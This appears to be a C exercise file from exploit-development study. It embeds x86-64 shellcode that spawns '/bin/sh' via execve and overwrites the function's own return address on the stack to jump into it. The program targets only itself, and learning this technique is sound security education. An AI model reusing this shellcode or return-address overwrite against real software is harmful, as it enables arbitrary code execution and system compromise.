// Combining ex4 (purely in bytes!) and our stack hack (ex2)
// Doh...
#include <stdio.h>
#include <stdint.h>

// zeroes: 12, 18, 19, 20, 33-36. 43-45, 49-52
char our_code[] = "\xeb\x2d\x5e\x6a\x00\x56\x48\xc7\xc0\x3b\x00\x00\x00\x48\x89\xe7\x48\x8d\x37\x48\x8b\x3f\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc3\x00\x00\x00\x00\x0f\x05\xe8\xce\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00";

void function(){
    uint64_t buffer[2] = { 0x33, 0x44};
    uint64_t *ret;

    ret = &buffer[5];
    *ret = our_code;
}

int main(){
    function();
    printf("Hello world!\n");
    return 0;
}
